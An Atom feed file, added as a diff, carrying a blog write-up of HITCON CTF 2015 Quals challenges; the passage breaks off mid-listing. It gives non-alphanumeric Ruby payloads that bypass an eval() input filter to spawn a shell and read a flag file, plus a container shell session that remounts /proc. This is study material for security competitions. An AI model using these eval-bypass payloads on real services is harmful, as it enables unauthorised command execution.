@@ -1,0 +1,609 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Just for noting - Write-up</title><link href="https://blog.m157q.tw/" rel="alternate"></link><link href="https://blog.m157q.tw/feeds/tag.write-up.atom.xml" rel="self"></link><id>https://blog.m157q.tw/</id><updated>2015-10-19T11:42:55+08:00</updated><entry><title>HITCON CTF 2015 Quals Write-up</title><link href="https://blog.m157q.tw/posts/2015/10/19/hitcon-ctf-2015-quals-write-up/" rel="alternate"></link><published>2015-10-19T11:42:55+08:00</published><updated>2015-10-19T11:42:55+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-10-19:/posts/2015/10/19/hitcon-ctf-2015-quals-write-up/</id><summary type="html">&lt;p&gt;Just a write-up for HITCON CTF 2015 Quals. So difficult. T_T&lt;/p&gt;</summary><content type="html">&lt;h2&gt;MISC - Flag not Found [1]&lt;/h2&gt;
+&lt;p&gt;Any &lt;code&gt;404 Nout Found&lt;/code&gt; page on &lt;a href="https://ctf2015.hitcon.org"&gt;https://ctf2015.hitcon.org&lt;/a&gt; will print out the flag.  &lt;/p&gt;
+&lt;p&gt;&lt;img alt="Flag not Found" src="/files/hitcon-ctf-2015-quals-write-up/flag-not-found.png"&gt;  &lt;/p&gt;
+&lt;p&gt;The flag is &lt;code&gt;hitcon{do_you_wanna_play_a_game?enjoy_hitcon_ctf_2015_quals:)}&lt;/code&gt;  &lt;/p&gt;
+&lt;hr&gt;
+&lt;h2&gt;MISC - hard to say [50*4]&lt;/h2&gt;
+&lt;p&gt;A description  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;Ruby on Fails.  &lt;/span&gt;
+&lt;span class="c"&gt;FLAG1: nc 54.199.215.185 9001  &lt;/span&gt;
+&lt;span class="c"&gt;FLAG2: nc 54.199.215.185 9002  &lt;/span&gt;
+&lt;span class="c"&gt;FLAG3: nc 54.199.215.185 9003  &lt;/span&gt;
+&lt;span class="c"&gt;FLAG4: nc 54.199.215.185 9004  &lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;with a Ruby source code &lt;code&gt;hard_to_say-151ba63da9ef7f11bcbba93657805f85.rb&lt;/code&gt;  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env ruby  &lt;/span&gt;
+
+&lt;span class="nb"&gt;fail&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;flag?&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;unless&lt;/span&gt; &lt;span class="no"&gt;File&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;file?&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;flag&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
+
+&lt;span class="vg"&gt;$stdout&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sync&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kp"&gt;true&lt;/span&gt;  
+
+&lt;span class="n"&gt;limit&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;ARGV&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;].&lt;/span&gt;&lt;span class="n"&gt;to_i&lt;/span&gt;  
+&lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Hi, I can say &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;limit&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; bytes :P&amp;quot;&lt;/span&gt;  
+&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="vg"&gt;$stdin&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gets&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip!&lt;/span&gt;  
+
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;limit&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="sr"&gt;/[[:alnum:]]/&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;  
+  &lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;oh... I cannot say this, maybe it is too long or too weird :(&amp;#39;&lt;/span&gt;  
+  &lt;span class="nb"&gt;exit&lt;/span&gt;  
+&lt;span class="k"&gt;end&lt;/span&gt;  
+
+&lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;I think size = &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; is ok to me.&amp;quot;&lt;/span&gt;  
+&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;to_s&lt;/span&gt;  
+&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="o"&gt;..-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;...&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;64&lt;/span&gt;  
+&lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;  
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We can see that:  &lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;The program will accept an input.  &lt;/li&gt;
+&lt;li&gt;There's a flag at &lt;code&gt;./flag&lt;/code&gt;.  &lt;/li&gt;
+&lt;li&gt;There's a input length limit which has been assigned as argv[0] since the program started.  &lt;ul&gt;
+&lt;li&gt;For flag 1 ~ 4, the input length limit are 1024/64/36/10 bytes.  &lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;You cannot have alphabets and numbers in the input.  &lt;/li&gt;
+&lt;li&gt;If your input pass the length and non-alnum test, it will be the argument of &lt;code&gt;eval()&lt;/code&gt;  &lt;/li&gt;
+&lt;li&gt;The program print out the result of &lt;code&gt;eval(input)&lt;/code&gt;  &lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3&gt;Flag1 (1024 bytes)&lt;/h3&gt;
+&lt;p&gt;At first, I have no idea about how to write a non-alnum Ruby code, I even don't  write Ruby.&lt;br&gt;
+Until one of my teammates gave a link &lt;a href="http://threeifbywhiskey.github.io/2014/03/05/non-alphanumeric-ruby-for-fun-and-not-much-else/"&gt;Non-Alphanumeric Ruby for Fun and Not Much Else&lt;/a&gt;.&lt;br&gt;
+After some discussions, try-and-error and with this link &lt;a href="http://stackoverflow.com/questions/2232/calling-shell-commands-from-ruby"&gt;Calling shell commands from Ruby - Stack Overflow&lt;/a&gt;,&lt;br&gt;
+we came up with &lt;code&gt;226 bytes&lt;/code&gt; solution for flag1.  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;__&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;which equal to  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cat ./flag&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;as a string input.&lt;br&gt;
+then we got flag1.&lt;br&gt;
+&lt;code&gt;hitcon{what does the ruby say? @#$%!@&amp;amp;(%!#$&amp;amp;(%!@#$!$?...}&lt;/code&gt;  &lt;/p&gt;
+&lt;h3&gt;Flag2 (64 bytes)&lt;/h3&gt;
+&lt;p&gt;After this, we got stucked with the 64 bytes limitation.&lt;br&gt;
+I came up with calling &lt;code&gt;sh&lt;/code&gt; to get shell instead of just &lt;code&gt;cat flag&lt;/code&gt;,&lt;br&gt;
+and one of my teammates found out that &lt;code&gt;$$&lt;/code&gt; is always &lt;code&gt;4&lt;/code&gt; on the target server.&lt;br&gt;
+So, we came up with the &lt;code&gt;61 bytes&lt;/code&gt; solution for flag2.  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
+
+&lt;span class="c1"&gt;# $_ = 1, @_ = 10, $. = 104, $.+@_+$_ = 115; ascii(&amp;#39;s&amp;#39;) == 115; ascii(&amp;#39;h&amp;#39;) == 104;  &lt;/span&gt;
+&lt;span class="c1"&gt;# `#{&amp;#39;&amp;#39;&amp;lt;&amp;lt;115&amp;lt;&amp;lt;104}` == `#{&amp;#39;sh&amp;#39;}`  &lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;After got the shell, just type &lt;code&gt;cat flag&lt;/code&gt; then &lt;code&gt;^D&lt;/code&gt; to get the output.&lt;br&gt;
+We got flag2.&lt;br&gt;
+&lt;code&gt;hitcon{Ruby in Peace m()m}&lt;/code&gt;  &lt;/p&gt;
+&lt;h3&gt;Flag3 (36 bytes)&lt;/h3&gt;
+&lt;p&gt;One of my teammates came up with calling &lt;code&gt;$0&lt;/code&gt; instead of &lt;code&gt;sh&lt;/code&gt; to get shell,&lt;br&gt;
+we got the &lt;code&gt;26 bytes&lt;/code&gt; solution.  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;$&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
+
+&lt;span class="c1"&gt;# `#{&amp;#39;$&amp;#39;&amp;lt;&amp;lt;48}` == `#{&amp;#39;$0&amp;#39;}`  &lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;then we got flag3&lt;br&gt;
+&lt;code&gt;hitcon{My cats also know how to code in ruby :cat:}&lt;/code&gt;  &lt;/p&gt;
+&lt;h3&gt;Flag4 (10 bytes)&lt;/h3&gt;
+&lt;p&gt;After this, I was trying to find how to just embed number into the string not by using &lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt;.&lt;br&gt;
+I found this link &lt;a href="http://stackoverflow.com/questions/17169671/ruby-eval-with-string-interpolation"&gt;Ruby: eval with string interpolation - Stack Overflow&lt;/a&gt;.&lt;br&gt;
+I also found that the predefined variable &lt;code&gt;$.&lt;/code&gt; is &lt;code&gt;The number of the last line read from the current input file.&lt;/code&gt;&lt;br&gt;
+It means that in this use case, &lt;code&gt;$.&lt;/code&gt; will always be &lt;code&gt;1&lt;/code&gt;.&lt;br&gt;
+so I came up with &lt;code&gt;11 bytes&lt;/code&gt; solution  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`$&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Still 1 byte more than the limitation,&lt;br&gt;
+I kept finding if there's a predefined variable in Ruby defualt to &lt;code&gt;0&lt;/code&gt; or&lt;br&gt;
+if &lt;code&gt;nil&lt;/code&gt; can be trans to &lt;code&gt;0&lt;/code&gt; because lots of predefined variable are default to &lt;code&gt;nil&lt;/code&gt;.&lt;br&gt;
+But NO.  &lt;/p&gt;
+&lt;p&gt;Then one of my teammates came up with the &lt;code&gt;10 bytes&lt;/code&gt; solution,&lt;br&gt;
+by using &lt;code&gt;~&lt;/code&gt;, the &lt;code&gt;Binary Ones Complement Operator&lt;/code&gt;. (bitwise Not)  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`$&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="o"&gt;~-&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
+
+&lt;span class="c1"&gt;# `$#{~-1}` == `$#{0}` == `$0`  &lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;then we got flag4&lt;br&gt;
+&lt;code&gt;hitcon{It's hard to say where ruby went wrong QwO}&lt;/code&gt;  &lt;/p&gt;
+&lt;h3&gt;Note&lt;/h3&gt;
+&lt;p&gt;After the competition end,&lt;br&gt;
+the author of this challenge released the same 10 bytes solution on IRC.&lt;br&gt;
+But said they got a &lt;code&gt;9 bytes&lt;/code&gt; solution  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`$&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="sr"&gt;//&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;I don't know how this solution works,&lt;br&gt;
+but it does not work on my computer with Ruby 2.2.3,&lt;br&gt;
+which &lt;code&gt;~//&lt;/code&gt; will be treat as &lt;code&gt;nil&lt;/code&gt; instead of &lt;code&gt;0&lt;/code&gt;.  &lt;/p&gt;
+&lt;hr&gt;
+&lt;h2&gt;Stego - Piranha Gun [50]&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;The Piranha Gun is a post-Plantera Hardmode ranged weapon that fires a single, returning &amp;quot;piranha&amp;quot; projectile that costs no ammunition.  &lt;/span&gt;
+&lt;span class="err"&gt;`nc 54.178.235.243 10004`  &lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nc &lt;span class="m"&gt;54&lt;/span&gt;.178.235.243 &lt;span class="m"&gt;10004&lt;/span&gt;  
+bash: cannot &lt;span class="nb"&gt;set&lt;/span&gt; terminal process group &lt;span class="o"&gt;(&lt;/span&gt;-1&lt;span class="o"&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class="k"&gt;for&lt;/span&gt; device  
+bash: no job control in this shell  
+bash: /root/.bashrc: Permission denied  
+root@ip-172-31-19-201:/home/PiranhaGun# ls  
+ls  
+README  
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;After connected to the server, there's a README.  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;root@ip-172-31-19-201:/home/PiranhaGun# cat README  &lt;/span&gt;
+&lt;span class="err"&gt;cat README  &lt;/span&gt;
+&lt;span class="err"&gt;The Piranha Gun can be found in &amp;quot;jungle.chest&amp;quot;.  &lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We searched if there's a file or directory with this name by using  &lt;/p&gt;
+&lt;p&gt;&lt;code&gt;grep -r "jungle.chest" / 2&amp;gt;/dev/null&lt;/code&gt;&lt;br&gt;
+&lt;code&gt;grep -r "jungle" / 2&amp;gt;/dev/null&lt;/code&gt;&lt;br&gt;
+&lt;code&gt;grep -r "chest" / 2&amp;gt;/dev/null&lt;/code&gt;  &lt;/p&gt;
+&lt;p&gt;But NO. There's only a directory &lt;code&gt;/chest&lt;/code&gt;, but it's empty.  &lt;/p&gt;
+&lt;p&gt;After tried something else, we still stucked.&lt;br&gt;
+Then, one of my teammates said he remembered security issue about the &lt;code&gt;proc&lt;/code&gt; in container.&lt;br&gt;
+After took a look at &lt;code&gt;ps&lt;/code&gt;, we got a clue.  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;root@ip-172-31-19-201:/home/PiranhaGun# ps  &lt;/span&gt;
+&lt;span class="err"&gt;ps  &lt;/span&gt;
+&lt;span class="err"&gt;Error, do this: mount -t proc proc /proc  &lt;/span&gt;
+&lt;span class="err"&gt;root@ip-172-31-19-201:/home/PiranhaGun# mount -t proc proc /proc  &lt;/span&gt;
+&lt;span class="err"&gt;mount -t proc proc /proc  &lt;/span&gt;
+&lt;span class="err"&gt;root@ip-172-31-19-201:/home/PiranhaGun# cd /proc  &lt;/span&gt;
+&lt;span class="err"&gt;cd /proc  &lt;/span&gt;
+&lt;span class="err"&gt;root@ip-172-31-19-201:/proc# ls -al  &lt;/span&gt;
+&lt;span class="err"&gt;ls -al  &lt;/span&gt;
+&lt;span class="err"&gt;total 4  &lt;/span&gt;
+&lt;span class="err"&gt;dr-xr-xr-x 128 nobody nogroup               0 Oct 19 05:25 .  &lt;/span&gt;
+&lt;span class="err"&gt;drwxr-xr-x  23 nobody nogroup            4096 Oct 16 13:29 ..  &lt;/span&gt;
+&lt;span class="err"&gt;dr-xr-xr-x   9 root   root                  0 Oct 19 05:26 1  &lt;/span&gt;
+&lt;span class="err"&gt;dr-xr-xr-x   9 root   root                  0 Oct 19 05:26 2  &lt;/span&gt;
+&lt;span class="err"&gt;dr-xr-xr-x   9 root   root                  0 Oct 19 05:26 7  &lt;/span&gt;
+&lt;span class="err"&gt;dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 acpi  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 buddyinfo  &lt;/span&gt;
+&lt;span class="err"&gt;dr-xr-xr-x   4 nobody nogroup               0 Oct 19 05:26 bus  &lt;/span&gt;
